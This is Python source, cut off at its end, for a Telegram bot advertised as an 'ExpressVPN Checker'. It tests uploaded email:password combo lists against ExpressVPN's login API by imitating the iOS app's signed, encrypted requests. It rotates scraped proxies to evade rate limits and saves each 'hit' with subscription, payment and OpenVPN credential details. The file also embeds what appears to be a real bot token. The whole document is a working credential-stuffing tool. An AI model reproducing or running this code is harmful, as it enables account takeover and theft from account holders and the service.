"""
╔══════════════════════════════════════════════════╗
║  𝗘𝘅𝗽𝗿𝗲𝘀𝘀𝗩𝗣𝗡 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗕𝗼𝘁                ║
║  𝗖𝗿𝗲𝗮𝘁𝗼𝗿: @Midas_ir                              ║
║  𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @Atom_Bin                               ║
╚══════════════════════════════════════════════════╝
"""

import os
import io
import sys
import json
import gzip
import hmac
import time
import hashlib
import base64
import random
import string
import asyncio
import logging
import tempfile
import subprocess
import threading
import re
from queue import Queue
from datetime import datetime
from functools import wraps
from concurrent.futures import ThreadPoolExecutor, as_completed

import httpx
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

from telegram import (
    Update, InputFile,
    InlineKeyboardButton, InlineKeyboardMarkup,
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters,
)
from telegram.constants import ParseMode, ChatAction

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 𝗖𝗢𝗡𝗙𝗜𝗚
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

BOT_TOKEN = os.getenv("BOT_TOKEN", "8516833981:AAGfsgG0vDzOzLNC9viruXa9l3wCz53LDOQ")
CREATOR = "@Midas_ir"
CHANNEL = "@Atom_Bin"
HMAC_KEY = b"@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
MAX_THREADS = 70
DEFAULT_CPM = 20
MAX_CPM = 70
REQUEST_TIMEOUT = 15
RESULTS_DIR = "Results"
TEMP_DIR = "temp"
PROXY_SCRAPE_TIMEOUT = 10
PROXY_CHECK_TIMEOUT = 8
PROXY_CHECK_URL = "http://httpbin.org/ip"
MAX_PROXY_CHECK_THREADS = 100

for d in [RESULTS_DIR, TEMP_DIR]:
    os.makedirs(d, exist_ok=True)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 𝗠𝗔𝗧𝗛 𝗕𝗢𝗟𝗗 𝗙𝗢𝗡𝗧 𝗖𝗢𝗡𝗩𝗘𝗥𝗧𝗘𝗥
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_MATH_BOLD_MAP = {}
for i, c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
    _MATH_BOLD_MAP[c] = chr(0x1D400 + i)
for i, c in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _MATH_BOLD_MAP[c] = chr(0x1D41A + i)
for i, c in enumerate("0123456789"):
    _MATH_BOLD_MAP[c] = chr(0x1D7CE + i)

def math_bold(text: str) -> str:
    return "".join(_MATH_BOLD_MAP.get(c, c) for c in text)

MB = math_bold

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 𝗨𝗧𝗜𝗟𝗜𝗧𝗬 𝗙𝗨𝗡𝗖𝗧𝗜𝗢𝗡𝗦
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_proxy(proxy_line: str):
    parts = proxy_line.strip().split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return None

def pkcs7_encrypt(data_bytes: bytes, cert_pem: str) -> bytes:
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".pem") as cf, \
             tempfile.NamedTemporaryFile(delete=False, suffix=".bin") as inf, \
             tempfile.NamedTemporaryFile(delete=False, suffix=".der") as outf:
            cf.write(cert_pem.encode("utf-8")); cf.flush()
            inf.write(data_bytes); inf.flush()
            subprocess.run([
                "openssl", "smime", "-encrypt", "-binary", "-aes128",
                "-outform", "DER", "-in", inf.name, "-out", outf.name, cf.name
            ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            outf.seek(0)
            encrypted = outf.read()
        for f in [cf.name, inf.name, outf.name]:
            try: os.unlink(f)
            except: pass
        return encrypted
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"OpenSSL encryption failed: {e}")

def hmac_sha1(key: bytes, data: bytes) -> str:
    return base64.b64encode(hmac.new(key, data, hashlib.sha1).digest()).decode()

def aes_decrypt(ciphertext: bytes, key: bytes, iv: bytes) -> bytes:
    decryptor = Cipher(
        algorithms.AES(key), modes.CBC(iv), backend=default_backend()
    ).decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()

def extract_between(text: str, left: str, right: str) -> str:
    try: return text.split(left)[1].split(right)[0]
    except: return ""

def save_result(label: str, data: str):
    os.makedirs(RESULTS_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d")
    with open(os.path.join(RESULTS_DIR, f"{label}_{ts}.txt"), "a", encoding="utf-8") as f:
        f.write(data + "\n")

def fmt_num(n: int) -> str:
    return f"{n:,}"

def parse_combos(text: str) -> list:
    lines = []
    for line in text.splitlines():
        line = line.strip()
        if not line: continue
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                lines.append(line.strip())
    return lines

def time_ago(seconds: int) -> str:
    if seconds < 60: return f"{seconds}s"
    elif seconds < 3600: return f"{seconds // 60}m {seconds % 60}s"
    else: return f"{seconds // 3600}h {(seconds % 3600) // 60}m"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 𝗣𝗥𝗢𝗫𝗬 𝗦𝗖𝗥𝗔𝗣𝗘𝗥 & 𝗖𝗛𝗘𝗖𝗞𝗘𝗥
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/ErcinDedeworken/proxies/main/proxies",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
]

class ProxyScraper:
    def __init__(self):
        self.proxies: set = set()
        self.alive: list = []
        self.dead: list = []
        self.checking = False
        self.scraping = False
        self.check_progress = 0
        self.check_total = 0
        self._lock = threading.Lock()
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()

    async def scrape(self, callback=None) -> list:
        self.scraping = True
        self.proxies = set()
        self._stop.clear()

        async with httpx.AsyncClient(timeout=PROXY_SCRAPE_TIMEOUT, verify=False) as client:
            tasks = []
            for url in PROXY_SOURCES:
                tasks.append(self._fetch_source(client, url))
            results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, set):
                self.proxies.update(result)

        self.scraping = False
        return list(self.proxies)

    async def _fetch_source(self, client, url) -> set:
        found = set()
        try:
            resp = await client.get(url)
            if resp.status_code == 200:
                text = resp.text
                pattern = re.compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}')
                matches = pattern.findall(text)
                for m in matches:
                    found.add(m.strip())
        except:
            pass
        return found

    def check_proxies(self, proxy_list: list, callback=None):
        self.checking = True
        self.alive = []
        self.dead = []
        self.check_total = len(proxy_list)
        self.check_progress = 0
        self._stop.clear()

        def check_single(proxy_str):
            if self._stop.is_set():
                return
            proxy_url = parse_proxy(proxy_str)
            if not proxy_url:
                with self._lock:
                    self.dead.append(proxy_str)
                    self.check_progress += 1
                return

            try:
                with httpx.Client(
                    proxy=proxy_url,
                    timeout=PROXY_CHECK_TIMEOUT,
                    verify=False
                ) as client:
                    resp = client.get(PROXY_CHECK_URL)
                    if resp.status_code == 200:
                        with self._lock:
                            self.alive.append(proxy_str)
                            self.check_progress += 1
                        return
            except:
                pass

            with self._lock:
                self.dead.append(proxy_str)
                self.check_progress += 1

        with ThreadPoolExecutor(max_workers=MAX_PROXY_CHECK_THREADS) as pool:
            futures = [pool.submit(check_single, p) for p in proxy_list]
            for f in as_completed(futures):
                if self._stop.is_set():
                    break
                if callback:
                    try: callback()
                    except: pass

        self.checking = False
        return self.alive

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗘𝗡𝗚𝗜𝗡𝗘
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class CheckerEngine:
    def __init__(self):
        self.running = False
        self.total = 0
        self.checked = 0
        self.hits = 0
        self.fails = 0
        self.errors = 0
        self.customs = 0
        self.cpm = DEFAULT_CPM
        self.proxies: list = []
        self.cert_pem: str = ""
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self.start_time = None
        self.hit_list: list = []
        self.custom_list: list = []
        self._load_cert()

    def _load_cert(self):
        try:
            with open("cert.pem", "r", encoding="utf-8") as f:
                self.cert_pem = f.read()
        except:
            self.cert_pem = ""

    def reset(self):
        with self._lock:
            self.total = self.checked = self.hits = self.fails = self.errors = self.customs = 0
            self.hit_list = []
            self.custom_list = []
            self.start_time = None

    def stop(self):
        self._stop.set()
        self.running = False

    def stats(self) -> dict:
        with self._lock:
            elapsed = int(time.time() - self.start_time) if self.start_time else 0
            progress = round((self.checked / self.total) * 100, 1) if self.total > 0 else 0
            real_cpm = round((self.checked / elapsed) * 60, 1) if elapsed > 0 else 0
            return {
                "total": self.total, "checked": self.checked,
                "hits": self.hits, "fails": self.fails,
                "errors": self.errors, "customs": self.customs,
                "progress": progress, "elapsed": elapsed,
                "real_cpm": real_cpm, "running": self.running,
            }

    def check_single(self, combo: str, proxy: str = None) -> dict:
        result = {"combo": combo, "status": "error", "details": ""}
        try:
            email, password = combo.split(":", 1)
        except:
            return result

        aes_key = os.urandom(16)
        aes_iv = os.urandom(16)

        payload = json.dumps({
            "email": email,
            "iv": base64.b64encode(aes_iv).decode(),
            "key": base64.b64encode(aes_key).decode(),
            "password": password
        }).encode()

        try:
            encrypted = pkcs7_encrypt(payload, self.cert_pem)
        except Exception as e:
            result["details"] = f"ENCRYPT_ERR: {e}"
            return result

        id_hex = os.urandom(32).hex()
        url_path = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={id_hex}&os_name=ios&os_version=14.4"
        h_sig = hmac_sha1(HMAC_KEY, url_path.encode())
        b_sig = hmac_sha1(HMAC_KEY, encrypted)
        proxy_url = parse_proxy(proxy) if proxy else None

        headers = {
            "User-Agent": "xvclient/v21.22.0 (ios; 14.4) ui/11.5.2",
            "Host": "www.expressapisv2.net",
            "Content-Type": "application/octet-stream",
            "Expect": "",
            "X-Body-Compression": "gzip",
            "X-Signature": f"2 {h_sig} 91c776e",
            "X-Body-Signature": f"2 {b_sig} 91c776e",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
        }

        full_url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={id_hex}&os_name=ios&os_version=14.4"

        try:
            with httpx.Client(proxy=proxy_url, timeout=REQUEST_TIMEOUT, verify=False) as client:
                resp = client.post(full_url, content=encrypted, headers=headers)
                code = resp.status_code

                if code == 200:
                    try:
                        dec = aes_decrypt(resp.content, aes_key, aes_iv).decode(errors="ignore")
                        at = extract_between(dec, '"access_token":"', '"')
                        ou = extract_between(dec, '"ovpn_username":"', '"')
                        op = extract_between(dec, '"ovpn_password":"', '"')

                        sub_url = f"/apis/v2/subscription?access_token={at}&client_version=11.5.2&installation_id={id_hex}&os_name=ios&os_version=14.4&reason=activation_with_email"
                        s_hmac = hmac_sha1(HMAC_KEY, sub_url.encode())
                        s_sig = f"2 {s_hmac} 91c776e"

                        bb = f'[{{"headers":{{"Accept-Language":"en","X-Signature":"{s_sig}"}},"method":"GET","url":"{sub_url}"}}]'
                        bb_hmac = hmac_sha1(HMAC_KEY, bb.encode())

                        bh = {
                            "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
                            "Host": "www.expressapisv2.net", "Expect": "",
                            "X-Signature": s_sig,
                            "X-Body-Signature": f"2 {bb_hmac} 91c776e",
                            "Accept-Language": "en",
                        }

                        br = client.post(
                            f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={id_hex}&os_name=ios&os_version=14.4",
                            headers=bh, content=bb.encode()
                        )

                        sd = br.text
                        plan = extract_between(sd, '"billing_cycle":', '"').strip('{}",')
                        expiry = extract_between(sd, '"expiration_time":', '"').strip('{}",')
                        ar = extract_between(sd, '"auto_bill":', '"').strip('{}",')
                        pm = extract_between(sd, '"payment_method":"', '"')

                        try:
                            ed = datetime.utcfromtimestamp(int(expiry)).strftime("%Y-%m-%d")
                            dl = (datetime.utcfromtimestamp(int(expiry)) - datetime.utcnow()).days
                        except:
                            ed, dl = "N/A", 0

                        capture = f"{email}:{password} | Plan: {plan} | Exp: {ed} ({dl}d) | Renew: {ar} | Pay: {pm} | OVPN: {ou}:{op}"
                        result["status"] = "hit"
                        result["details"] = capture
                        save_result("Hits", capture)
                    except Exception as e:
                        result["status"] = "custom"
                        result["details"] = f"{email}:{password} | DEC_ERR: {e}"
                        save_result("Custom", result["details"])

                elif code in [400, 401]:
                    result["status"] = "fail"
                    result["details"] = f"{email}:{password} | {code}"
                elif code == 429:
                    result["status"] = "retry"
                    result["details"] = f"{email}:{password} | RATE_LIMITED"
                else:
                    result["status"] = "error"
                    result["details"] = f"{email}:{password} | HTTP {code}"
                    save_result("Error", result["details"])

        except Exception as e:
            result["status"] = "error"
            result["details"] = f"{email}:{password} | {e}"
        return result

    def run(self, combos: list, callback=None):
        self.reset()
        self.running = True
        self._stop.clear()
        self.total = len(combos)
        self.start_time = time.time()

        q = Queue()
        for c in combos:
            q.put(c)

        def worker():
            while not q.empty() and not self._stop.is_set():
                combo = q.get()
                proxy = None
                if self.proxies:
                    proxy = self.proxies[q.qsize() % len(self.proxies)]

                res = self.check_single(combo, proxy)

                with self._lock:
                    self.checked += 1
                    if res["status"] == "hit":
                        self.hits += 1
                        self.hit_list.append(res["details"])
                    elif res["status"] == "fail":
                        self.fails += 1
                    elif res["status"] == "custom":
                        self.customs += 1
                        self.custom_list.append(res["details"])
                    elif res["status"] == "retry":
                        q.put(combo)
                    else:
                        self.errors += 1

                if callback:
                    try: callback(res)
                    except: pass

                time.sleep(60.0 / max(self.cpm, 1))
                q.task_done()

        tc = min(self.cpm, MAX_THREADS)
        threads = []
        for _ in range(tc):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        def monitor():
            for t in threads:
                t.join()
            self.running = False
            if callback:
                try: callback({"status": "finished", "details": "done"})
                except: pass

        threading.Thread(target=monitor, daemon=True).start()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 𝗞𝗘𝗬𝗕𝗢𝗔𝗥𝗗𝗦
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def kb_main():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"🚀 {MB('Start Check')}", callback_data="start_check"),
            InlineKeyboardButton(f"📊 {MB('Stats')}", callback_data="stats"),
        ],
        [
            InlineKeyboardButton(f"⚙️ {MB('Settings')}", callback_data="settings"),
            InlineKeyboardButton(f"📖 {MB('Help')}", callback_data="help"),
        ],
        [
            InlineKeyboardButton(f"🌐 {MB('Proxy Scraper')}", callback_data="proxy_menu"),
            InlineKeyboardButton(f"⏹ {MB('Stop')}", callback_data="stop_check"),
        ],
        [
            InlineKeyboardButton(f"📢 {MB('Channel')}", url="https://t.me/Atom_Bin"),
            InlineKeyboardButton(f"👨‍💻 {MB('Creator')}", url="https://t.me/Midas_ir"),
        ],
    ])

def kb_settings(cpm):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⚡ {MB('CPM')}: {cpm}", callback_data="cur_cpm")],
        [
            InlineKeyboardButton(f"➖ {MB('5')}", callback_data="cpm_dn"),
            InlineKeyboardButton(f"➕ {MB('5')}", callback_data="cpm_up"),
        ],
        [
            InlineKeyboardButton(f"➖ {MB('10')}", callback_data="cpm_dn10"),
            InlineKeyboardButton(f"➕ {MB('10')}", callback_data="cpm_up10"),
        ],
        [InlineKeyboardButton(f"🔙 {MB('Back')}", callback_data="back_main")],
    ])

def kb_proxy():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"🔍 {MB('Scrape Proxies')}", callback_data="proxy_scrape"),
        ],
        [
            InlineKeyboardButton(f"✅ {MB('Check Proxies')}", callback_data="proxy_check"),
        ],
        [
            InlineKeyboardButton(f"📤 {MB('Upload Proxies')}", callback_data="proxy_upload"),
            InlineKeyboardButton(f"🗑 {MB('Clear')}", callback_data="proxy_clear"),
        ],
        [
            InlineKeyboardButton(f"📊 {MB('Proxy Stats')}", callback_data="proxy_stats"),
        ],
        [InlineKeyboardButton(f"🔙 {MB('Back')}", callback_data="back_main")],
    ])

def kb_proxy_set():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"✅ {MB('Yes, Set as Bot Proxy')}", callback_data="proxy_set_yes"),
            InlineKeyboardButton(f"❌ {MB('No, Send File')}", callback_data="proxy_set_no"),
        ],
    ])

def kb_back():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🔙 {MB('Back')}", callback_data="back_main")]
    ])

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 𝗨𝗦𝗘𝗥 𝗦𝗘𝗦𝗦𝗜𝗢𝗡𝗦
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

user_sessions: dict = {}
checker_engines: dict = {}
proxy_scrapers: dict = {}

def get_sess(uid: int) -> dict:
    if uid not in user_sessions:
        user_sessions[uid] = {
            "cpm": DEFAULT_CPM, "proxies": [], "state": None,
            "combos": [], "scraped_proxies": [], "alive_proxies": [],
        }
    return user_sessions[uid]

def get_engine(uid: int) -> CheckerEngine:
    if uid not in checker_engines:
        checker_engines[uid] = CheckerEngine()
    return checker_engines[uid]

def get_scraper(uid: int) -> ProxyScraper:
    if uid not in proxy_scrapers:
        proxy_scrapers[uid] = ProxyScraper()
    return proxy_scrapers[uid]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 𝗦𝗧𝗔𝗧𝗦 𝗕𝗨𝗜𝗟𝗗𝗘𝗥
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def build_stats(engine: CheckerEngine) -> str:
    s = engine.stats()
    si = "🟢" if s["running"] else "🔴"
    st = MB("Running") if s["running"] else MB("Stopped")
    bl = 20
    fl = int(s["progress"] / 100 * bl)
    bar = "█" * fl + "░" * (bl - fl)

    return (
        f"╔════════════════════════════════╗\n"
        f"║  📊 {MB('ExpressVPN Checker Stats')}\n"
        f"╠════════════════════════════════╣\n"
        f"║ {si} {MB('Status')}: {st}\n"
        f"║\n"
        f"║ 📦 {MB('Total')}: {fmt_num(s['total'])}\n"
        f"║ ✅ {MB('Checked')}: {fmt_num(s['checked'])}\n"
        f"║ 🎯 {MB('Hits')}: {fmt_num(s['hits'])}\n"
        f"║ ❌ {MB('Fails')}: {fmt_num(s['fails'])}\n"
        f"║ ⚠️ {MB('Errors')}: {fmt_num(s['errors'])}\n"
        f"║ 🔶 {MB('Custom')}: {fmt_num(s['customs'])}\n"
        f"║\n"
        f"║ 📈 {MB('Progress')}: {s['progress']}%\n"
        f"║ [{bar}]\n"
        f"║\n"
        f"║ ⚡ {MB('Real CPM')}: {s['real_cpm']}\n"
        f"║ ⏱ {MB('Time')}: {time_ago(s['elapsed'])}\n"
        f"╠════════════════════════════════╣\n"
        f"║ 👨‍💻 {MB('Creator')}: {CREATOR}\n"
        f"║ 📢 {MB('Channel')}: {CHANNEL}\n"
        f"╚════════════════════════════════╝"
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 𝗕𝗢𝗧 𝗛𝗔𝗡𝗗𝗟𝗘𝗥𝗦
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    get_sess(uid)
    await context.bot.send_chat_action(update.effective_chat.id, ChatAction.TYPING)

    welcome = (
        f"🌟 {MB('Welcome to ExpressVPN Checker Bot!')}\n\n"
        f"🔹 {MB('Send your combo file')} (.txt)\n"
        f"🔹 {MB('Format')}: email:pass / user:pass\n"
        f"🔹 {MB('Supports large TXT files')}\n"
        f"🔹 {MB('Built-in Proxy Scraper & Checker')}\n\n"
        f"👨‍💻 {MB('Creator')}: {CREATOR}\n"
        f"📢 {MB('Channel')}: {CHANNEL}\n"
        f"{'━' * 35}"
    )
    await update.message.reply_text(welcome, reply_markup=kb_main())

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(update.effective_chat.id, ChatAction.TYPING)
    h = (
        f"📖 {MB('Help Guide')}\n\n"
        f"1️⃣ {MB('Send TXT combo file')}\n"
        f"   {MB('Format')}: email:pass\n\n"
        f"2️⃣ {MB('Adjust CPM in Settings')}\n\n"
        f"3️⃣ {MB('Proxy')} ({MB('Optional')}):\n"
        f"   {MB('Scrape + Check + Auto Set')}\n"
        f"   {MB('Or upload your own')}\n\n"
        f"4️⃣ {MB('Hit Start Check')}\n\n"
        f"📌 {MB('Commands')}:\n"
        f"/start — {MB('Main Menu')}\n"
        f"/help — {MB('Help')}\n"
        f"/stats — {MB('Statistics')}\n"
        f"/stop — {MB('Stop Checker')}\n\n"
        f"👨‍💻 {CREATOR} | 📢 {CHANNEL}"
    )
    await update.message.reply_text(h, reply_markup=kb_back())

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    engine = get_engine(uid)
    await update.message.reply_text(build_stats(engine), reply_markup=kb_back())

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    engine = get_engine(uid)
    if engine.running:
        engine.stop()
        await update.message.reply_text(f"⏹ {MB('Checker stopped.')}", reply_markup=kb_main())
    else:
        await update.message.reply_text(f"⚠️ {MB('No checker is running.')}", reply_markup=kb_main())

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 𝗙𝗜𝗟𝗘 𝗛𝗔𝗡𝗗𝗟𝗘𝗥
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    sess = get_sess(uid)
    msg = update.message
    doc = msg.document

    if not doc:
        await msg.reply_text(f"❌ {MB('Please send a TXT file.')}")
        return

    if not doc.file_name.lower().endswith(".txt"):
        await msg.reply_text(f"❌ {MB('Only .txt files are supported.')}")
        return

    await context.bot.send_chat_action(msg.chat_id, ChatAction.UPLOAD_DOCUMENT)
    status = await msg.reply_text(f"⏳ {MB('Downloading file...')}")

    try:
        file = await doc.get_file()
        fp = os.path.join(TEMP_DIR, f"{uid}_{doc.file_name}")
        await file.download_to_drive(fp)

        with open(fp, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        state = sess.get("state")

        if state == "proxy_upload":
            proxies = [l.strip() for l in content.splitlines() if l.strip() and ":" in l]
            sess["proxies"] = proxies
            sess["state"] = None
            await status.edit_text(
                f"✅ {MB(f'{fmt_num(len(proxies))} proxies loaded!')}",
                reply_markup=kb_proxy(),
            )
        else:
            combos = parse_combos(content)
            if not combos:
                await status.edit_text(
                    f"❌ {MB('No valid combos found.')}\n"
                    f"{MB('Format')}: email:pass"
                )
                return

            sess["combos"] = combos
            sess["state"] = "combo_loaded"

            px = len(sess["proxies"])
            await status.edit_text(
                f"✅ {MB(f'{fmt_num(len(combos))} combos loaded!')}\n\n"
                f"⚡ {MB('CPM')}: {sess['cpm']}\n"
                f"📡 {MB('Proxies')}: {'✅ ' + str(px) if px else '❌ None'}\n\n"
                f"🚀 {MB('Hit Start Check to begin.')}",
                reply_markup=kb_main(),
            )

        try: os.unlink(fp)
        except: pass

    except Exception as e:
        await status.edit_text(f"❌ {MB('File error')}: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 𝗧𝗘𝗫𝗧 𝗛𝗔𝗡𝗗𝗟𝗘𝗥
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    sess = get_sess(uid)
    text = update.message.text.strip()
    if text.startswith("/"): return

    combos = parse_combos(text)
    if combos:
        sess["combos"] = combos
        sess["state"] = "combo_loaded"
        await update.message.reply_text(
            f"✅ {MB(f'{fmt_num(len(combos))} combos received!')}\n\n"
            f"🚀 {MB('Hit Start Check to begin.')}",
            reply_markup=kb_main(),
        )
    else:
        await update.message.reply_text(
            f"❌ {MB('Invalid format.')}\n{MB('Send .txt file or paste combos.')}\n{MB('Format')}: email:pass",
        )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 𝗖𝗔𝗟𝗟𝗕𝗔𝗖𝗞 𝗛𝗔𝗡𝗗𝗟𝗘𝗥
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    sess = get_sess(uid)
    engine = get_engine(uid)
    scraper = get_scraper(uid)
    data = q.data
    chat_id = q.message.chat_id

    # ── Back ──
    if data == "back_main":
        await q.edit_message_text(
            f"🏠 {MB('Main Menu')}\n\n👨‍💻 {MB('Creator')}: {CREATOR}\n📢 {MB('Channel')}: {CHANNEL}",
            reply_markup=kb_main(),
        )

    # ── Start Check ──
    elif data == "start_check":
        combos = sess.get("combos", [])
        if not combos:
            await q.edit_message_text(f"❌ {MB('Send a combo file first!')}", reply_markup=kb_main())
            return
        if engine.running:
            await q.edit_message_text(f"⚠️ {MB('Checker already running. Stop it first.')}", reply_markup=kb_main())
            return
        if not engine.cert_pem:
            await q.edit_message_text(f"❌ {MB('cert.pem not found!')}", reply_markup=kb_main())
            return

        engine.cpm = sess["cpm"]
        engine.proxies = sess.get("proxies", [])

        await q.edit_message_text(
            f"🚀 {MB('Starting checker...')}\n\n"
            f"📦 {MB('Combos')}: {fmt_num(len(combos))}\n"
            f"⚡ {MB('CPM')}: {sess['cpm']}\n"
            f"📡 {MB('Proxies')}: {len(engine.proxies)}",
        )

        last_up = {"time": 0, "msg_id": None}

        async def live_update(res: dict):
            now = time.time()
            if now - last_up["time"] < 3 and res["status"] != "finished":
                return
            last_up["time"] = now
            s = engine.stats()

            icons = {"hit": "🎯", "fail": "❌", "custom": "🔶", "finished": "🏁", "error": "⚠️", "retry": "🔄"}
            icon = icons.get(res["status"], "⚠️")
            bl = 20
            fl = int(s["progress"] / 100 * bl)
            bar = "█" * fl + "░" * (bl - fl)

            txt = (
                f"{icon} {MB(res['status'].upper())}\n"
                f"{res.get('details', '')[:300]}\n\n"
                f"[{bar}] {s['progress']}%\n"
                f"✅{s['checked']}/{s['total']} | 🎯{s['hits']} | ❌{s['fails']} | ⚡{s['real_cpm']} {MB('CPM')}"
            )

            try:
                if last_up["msg_id"]:
                    await context.bot.edit_message_text(txt, chat_id=chat_id, message_id=last_up["msg_id"])
                else:
                    sent = await context.bot.send_message(chat_id=chat_id, text=txt)
                    last_up["msg_id"] = sent.message_id
            except: pass

            if res["status"] == "finished":
                final = build_stats(engine)
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=f"🏁 {MB('Check Completed!')}\n\n{final}",
                    reply_markup=kb_main(),
                )
                if engine.hit_list:
                    hc = "\n".join(engine.hit_list)
                    bio = io.BytesIO(hc.encode("utf-8"))
                    bio.name = f"Hits_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"
                    await context.bot.send_document(
                        chat_id=chat_id, document=InputFile(bio),
                        caption=f"🎯 {MB(f'{len(engine.hit_list)} Hits Found!')}",
                    )
                if engine.custom_list:
